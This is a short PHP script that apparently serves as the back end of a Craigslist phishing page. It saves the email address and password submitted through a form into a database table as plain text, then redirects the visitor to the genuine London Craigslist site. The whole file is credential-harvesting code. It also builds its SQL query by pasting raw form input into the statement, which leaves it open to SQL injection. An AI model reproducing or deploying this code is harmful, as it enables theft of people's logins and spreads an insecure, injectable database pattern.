<?php

include("dbs.php");

$sql = "INSERT INTO `Users`(`EMAIL`, `PASS`) VALUES ('" . $_POST["inputEmailHandle"] . "','" . $_POST["inputPassword"] . "')";

if (($result = $conn->query($sql)) !== FALSE) {
  header("Location: https://london.craigslist.co.uk/");
  die();
} else {
  header("Location: localhost");
  die();
}
?>
